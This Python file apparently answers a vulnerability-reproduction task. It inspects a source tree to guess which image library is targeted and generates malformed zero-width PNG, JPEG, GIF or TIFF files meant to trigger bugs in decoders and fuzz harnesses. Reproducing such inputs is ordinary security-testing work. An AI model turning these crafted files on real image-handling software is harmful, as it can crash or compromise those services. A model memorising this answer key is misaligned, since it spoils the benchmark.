import os
import re
import tarfile
import struct
import binascii
import zlib
from collections import defaultdict


def _png_chunk(ctype: bytes, data: bytes) -> bytes:
    crc = binascii.crc32(ctype)
    crc = binascii.crc32(data, crc) & 0xFFFFFFFF
    return struct.pack(">I", len(data)) + ctype + data + struct.pack(">I", crc)


def _gen_png_zero_width(height: int = 4096) -> bytes:
    if height < 1:
        height = 1
    sig = b"\x89PNG\r\n\x1a\n"
    width = 0
    ihdr = struct.pack(">IIBBBBB", width, height, 8, 6, 0, 0, 0)
    raw = b"\x00" * height  # one filter byte per scanline when width==0
    comp = zlib.compress(raw, 9)
    return sig + _png_chunk(b"IHDR", ihdr) + _png_chunk(b"IDAT", comp) + _png_chunk(b"IEND", b"")


def _jpeg_segment(marker: bytes, payload: bytes) -> bytes:
    return marker + struct.pack(">H", len(payload) + 2) + payload


def _gen_jpeg_zero_width(height: int = 1) -> bytes:
    if height < 1:
        height = 1
    width = 0

    soi = b"\xFF\xD8"
    eoi = b"\xFF\xD9"

    app0 = b"JFIF\x00\x01\x01\x00\x00\x01\x00\x01\x00\x00"

    qt = bytes([
        16, 11, 10, 16, 24, 40, 51, 61,
        12, 12, 14, 19, 26, 58, 60, 55,
        14, 13, 16, 24, 40, 57, 69, 56,
        14, 17, 22, 29, 51, 87, 80, 62,
        18, 22, 37, 56, 68, 109, 103, 77,
        24, 35, 55, 64, 81, 104, 113, 92,
        49, 64, 78, 87, 103, 121, 120, 101,
        72, 92, 95, 98, 112, 100, 103, 99
    ])
    dqt = b"\x00" + qt

    sof0 = b"\x08" + struct.pack(">H", height) + struct.pack(">H", width) + b"\x01" + b"\x01\x11\x00"

    # Minimal Huffman tables: only symbol 0 for DC and EOB for AC
    dc_counts = bytes([1] + [0] * 15)
    dc_symbols = b"\x00"
    dht_dc = b"\x00" + dc_counts + dc_symbols

    ac_counts = bytes([1] + [0] * 15)
    ac_symbols = b"\x00"
    dht_ac = b"\x10" + ac_counts + ac_symbols

    sos = b"\x01" + b"\x01\x00" + b"\x00\x3F\x00"

    # Entropy data: DC(0) + EOB, padded with 1s => bits: 0,0,111111 => 0x3F
    scan = b"\x3F"

    out = bytearray()
    out += soi
    out += _jpeg_segment(b"\xFF\xE0", app0)
    out += _jpeg_segment(b"\xFF\xDB", dqt)
    out += _jpeg_segment(b"\xFF\xC0", sof0)
    out += _jpeg_segment(b"\xFF\xC4", dht_dc)
    out += _jpeg_segment(b"\xFF\xC4", dht_ac)
    out += _jpeg_segment(b"\xFF\xDA", sos)
    out += scan
    out += eoi
    return bytes(out)


def _gen_gif_zero_width(height: int = 1) -> bytes:
    if height < 1:
        height = 1
    width = 0
    hdr = b"GIF89a"
    lsd = struct.pack("<HH", width, height) + bytes([0xF0, 0x00, 0x00])  # GCT 2 entries
    gct = b"\x00\x00\x00\xFF\xFF\xFF"
    img_desc = b"\x2C" + struct.pack("<HHHH", 0, 0, width, height) + b"\x00"
    lzw_min = b"\x02"
    # Clear(4), End(5) with code size 3 -> packed LSB-first -> 0x2C
    img_data = b"\x01\x2C\x00"
    trailer = b"\x3B"
    return hdr + lsd + gct + img_desc + lzw_min + img_data + trailer


def _gen_tiff_zero_width() -> bytes:
    # Minimal little-endian TIFF with width=0, length=1, one strip with 1 byte.
    # Header: II* + IFD offset=8
    header = b"II*\x00" + struct.pack("<I", 8)

    # IFD entries
    entries = []

    def add(tag, typ, count, value):
        entries.append((tag, typ, count, value))

    # Types: 3=SHORT (2 bytes), 4=LONG (4 bytes)
    add(256, 4, 1, 0)   # ImageWidth = 0
    add(257, 4, 1, 1)   # ImageLength = 1
    add(258, 3, 1, 8)   # BitsPerSample = 8
    add(259, 3, 1, 1)   # Compression = none
    add(262, 3, 1, 1)   # Photometric = BlackIsZero
    add(273, 4, 1, 0)   # StripOffsets = to be patched
    add(277, 3, 1, 1)   # SamplesPerPixel = 1
    add(278, 4, 1, 1)   # RowsPerStrip = 1
    add(279, 4, 1, 1)   # StripByteCounts = 1

    ifd_count = len(entries)
    ifd = bytearray()
    ifd += struct.pack("<H", ifd_count)

    # We'll place pixel data right after IFD + nextIFD (4 bytes)
    ifd_size = 2 + ifd_count * 12 + 4
    pixel_offset = 8 + ifd_size

    for tag, typ, count, value in entries:
        if tag == 273:
            value = pixel_offset
        if typ == 3 and count == 1:
            val_field = struct.pack("<H", value) + b"\x00\x00"
        else:
            val_field = struct.pack("<I", value)
        ifd += struct.pack("<HHI", tag, typ, count) + val_field

    ifd += struct.pack("<I", 0)  # next IFD offset
    pixel = b"\x00"
    return header + bytes(ifd) + pixel


def _iter_src_files_from_tar(src_path: str):
    with tarfile.open(src_path, "r:*") as tf:
        for m in tf:
            if not m.isfile():
                continue
            yield tf, m


def _iter_src_files_from_dir(src_path: str):
    for root, _, files in os.walk(src_path):
        for fn in files:
            path = os.path.join(root, fn)
            try:
                st = os.stat(path)
            except OSError:
                continue
            yield path, st.st_size


def _guess_format(src_path: str) -> str:
    scores = defaultdict(int)

    def score_from_name(name_l: str):
        # file name based hints
        if "png" in name_l or "spng" in name_l or "lodepng" in name_l:
            scores["png"] += 5
        if "jpeg" in name_l or "jpg" in name_l or "jpeglib" in name_l or "mozjpeg" in name_l:
            scores["jpeg"] += 5
        if "gif" in name_l or "giflib" in name_l:
            scores["gif"] += 5
        if "tiff" in name_l or "libtiff" in name_l or name_l.endswith(".tif") or name_l.endswith(".tiff"):
            scores["tiff"] += 5
        if "stb_image" in name_l or "stbimage" in name_l:
            scores["png"] += 2

        # testdata extensions
        if name_l.endswith(".png"):
            scores["png"] += 2
        elif name_l.endswith(".jpg") or name_l.endswith(".jpeg"):
            scores["jpeg"] += 2
        elif name_l.endswith(".gif"):
            scores["gif"] += 2
        elif name_l.endswith(".tif") or name_l.endswith(".tiff"):
            scores["tiff"] += 2

    def score_from_content(data: bytes):
        d = data
        # fuzz harness hint
        if b"LLVMFuzzerTestOneInput" in d or b"FuzzedDataProvider" in d:
            scores["_has_fuzz"] += 1

        # includes / APIs
        if b"png.h" in d or b"png_" in d or b"spng_" in d or b"lodepng" in d:
            scores["png"] += 15
        if b"jpeglib.h" in d or b"jpeg_" in d or b"tjDecompress" in d:
            scores["jpeg"] += 15
        if b"gif_lib.h" in d or b"DGif" in d or b"EGif" in d:
            scores["gif"] += 15
        if b"tiffio.h" in d or b"TIFFOpen" in d or b"TIFFRead" in d:
            scores["tiff"] += 15
        if b"stbi_load_from_memory" in d or b"stbi_info_from_memory" in d or b"stb_image.h" in d:
            scores["png"] += 6  # choose png as easiest path

    # Try tarball scanning first
    is_tar = False
    try:
        with tarfile.open(src_path, "r:*"):
            is_tar = True
    except Exception:
        is_tar = False

    if is_tar:
        max_files = 2500
        read_limit = 250_000
        n = 0
        try:
            for tf, m in _iter_src_files_from_tar(src_path):
                n += 1
                if n > max_files:
                    break
                name_l = m.name.lower()
                score_from_name(name_l)
                if m.size <= 0 or m.size > read_limit:
                    continue
                if not any(name_l.endswith(ext) for ext in (".c", ".cc", ".cpp", ".cxx", ".h", ".hpp", ".rs", ".go", ".java", ".py", ".txt", ".md", ".cmake", "meson.build")):
                    if "fuzz" not in name_l and "test" not in name_l and "readme" not in name_l and "cmake" not in name_l:
                        continue
                try:
                    f = tf.extractfile(m)
                    if not f:
                        continue
                    data = f.read(read_limit)
                except Exception:
                    continue
                score_from_content(data)
                if scores.get("png", 0) >= 25 or scores.get("jpeg", 0) >= 25 or scores.get("gif", 0) >= 25 or scores.get("tiff", 0) >= 25:
                    # early exit if strong signal found
                    if scores.get("_has_fuzz", 0) >= 1:
                        break
        except Exception:
            pass
    else:
        max_files = 4000
        read_limit = 200_000
        n = 0
        for path, sz in _iter_src_files_from_dir(src_path):
            n += 1
            if n > max_files:
                break
            name_l = path.lower()
            score_from_name(name_l)
            if sz <= 0 or sz > read_limit:
                continue
            if not any(name_l.endswith(ext) for ext in (".c", ".cc", ".cpp", ".cxx", ".h", ".hpp", ".rs", ".go", ".java", ".py", ".txt", ".md", ".cmake")) and "fuzz" not in name_l and "test" not in name_l and "readme" not in name_l:
                continue
            try:
                with open(path, "rb") as f:
                    data = f.read(read_limit)
            except Exception:
                continue
            score_from_content(data)
            if scores.get("png", 0) >= 25 or scores.get("jpeg", 0) >= 25 or scores.get("gif", 0) >= 25 or scores.get("tiff", 0) >= 25:
                if scores.get("_has_fuzz", 0) >= 1:
                    break

    # Decide best
    best = "png"
    best_score = -1
    for k in ("png", "jpeg", "gif", "tiff"):
        sc = scores.get(k, 0)
        if sc > best_score:
            best_score = sc
            best = k

    return best


class Solution:
    def solve(self, src_path: str) -> bytes:
        fmt = _guess_format(src_path)
        if fmt == "jpeg":
            return _gen_jpeg_zero_width(height=1)
        if fmt == "gif":
            return _gen_gif_zero_width(height=1)
        if fmt == "tiff":
            return _gen_tiff_zero_width()
        return _gen_png_zero_width(height=4096)